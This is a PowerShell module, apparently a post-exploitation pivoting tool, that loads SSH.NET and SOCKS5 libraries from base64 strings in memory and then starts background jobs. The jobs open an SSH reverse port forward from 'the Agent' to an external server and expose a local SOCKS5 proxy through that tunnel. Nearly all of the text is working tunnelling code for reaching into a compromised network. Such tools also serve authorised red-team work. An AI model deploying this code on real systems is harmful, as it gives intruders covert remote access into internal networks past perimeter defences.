
    
# reverse port forward job definition
$startReverseForward = {
    Param([string]$sshhost, 
    [string]$username,
    [string]$password,
    [int]$RemotePort, 
    [String]$DestHost, 
    [int]$DestPort
    )
    
    # library is from https://github.com/sshnet/SSH.NET
    $assemblybytesb64 = ""
    $assemblybytes = [System.Convert]::FromBase64String($assemblybytesb64)
    [System.Reflection.Assembly]::Load($assemblybytes)


    $authmethod = New-Object Renci.SshNet.PasswordAuthenticationMethod($username, $password)

    $conninfo = New-Object Renci.SshNet.ConnectionInfo $sshhost, $username, $authmethod

    $client = New-Object Renci.SshNet.SshClient $conninfo

    $client.connect()

    # weeey!

    $portfwd = new-object Renci.SshNet.ForwardedPortRemote $RemotePort, $DestHost, $DestPort
    $client.AddForwardedPort($portfwd)
    
    $portfwd.Start()

    #this probably never gets executed, the job is usually killed at this point
    while ($true) {}
    $portfwd.Stop()
    $client.Disconnect()
}

# socks proxy job
$StartSocksProxy = {
    Param([string]$sshhost, 
    [string]$username,
    [string]$password,
    [int]$RemotePort,
    [int]$LocalPort
    )
    # library from https://github.com/thrdev/socks5
    $assemblybytesb64 = ""
    $assemblybytes = [System.Convert]::FromBase64String($assemblybytesb64)
    [System.Reflection.Assembly]::Load($assemblybytes)

    # start a socks proxy
    $proxy = new-object socks5.Socks5Server "127.0.0.1", $LocalPort
    $proxy.Start()

    while($true){}
}



<#
.SYNOPSIS

Sets up a reverse tunnel to server and spawns a local socks5 proxy

Author: @fridgehead
License: I dont care
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Sets up a reverse port forward from the Agent back to an external server, it then spawns a local socks5 proxy so that the SSH server can access it.

.PARAMETER sshhost

Host to tunnel out to

.PARAMETER username

Username to connect to SSH server with

.PARAMETER password

Password for ssh connections

.PARAMETER RemotePort

Port to listen to on the SSH server

.PARAMETER LocalPort

Port for local Socks proxy, pick one that isnt in use


#>
function Start-SocksProxy(){

    [CmdletBinding()]
    Param([string]$sshhost, 
    [string]$username,
    [string]$password,
    [int]$RemotePort,
    [int]$LocalPort
    )

    start-job -ScriptBlock $StartSocksProxy -Name SSHJOB.PROXY -ArgumentList $sshhost, $username, $password, $RemotePort, $LocalPort 
    start-job -ScriptBlock $startReverseForward -Name SSHJOB -ArgumentList $sshhost, $username, $password, $RemotePort, "127.0.0.1", $LocalPort
    write-host "Reverse port forward job started.. on local port ",$sshost, " port ", $RemotePort 

}
function Start-ReversePortForward() {
<#
.SYNOPSIS

Sets up a reverse port forward using SSH
Author: @fridgehead
License: I dont care
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Sets up a reverse port forward from the Agent back to an external server. 

.PARAMETER Host

Host to connect the SSH tunnel to

.PARAMETER Username

Username for SSH connection

.PARAMETER Password

Password for SSH connection

.PARAMETER RemotePort

Port to listen on at the SSH server

.PARAMETER DestHost

Destination host to forward traffic to

.PARAMETER DestPort

Destination Port to forward traffic to


.EXAMPLE

    startPortForward PARAM PARAM PARAM


#>
    [CmdletBinding()]
    Param([string]$sshhost, 
    [string]$username,
    [string]$password,
    [int]$RemotePort, 
    [String]$DestHost, 
    [int]$DestPort
    )
    $jobs = Get-Job -Name SSHJOB -ErrorAction SilentlyContinue
    if ($jobs -ne $null ){
        write-host -ForegroundColor Red "job already running"
        return
    }

    start-job -ScriptBlock $startReverseForward -Name SSHJOB -ArgumentList $sshhost, $username, $password, $RemotePort, $DestHost, $DestPort
    write-host "Reverse port forward job started.."
    
}



function Stop-PortForwardJobs(){
<#
.SYNOPSIS

Stops any jobs started started by this module
Author: @fridghead
License: I dont care
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Stops port forwards started by Start-ReversePortForward


#>
    [CmdletBinding()]
    $jobs = Get-Job | where {$_.name -like "SSHJOB*"}
    $jobs | % {Stop-Job $_; Remove-Job $_}
}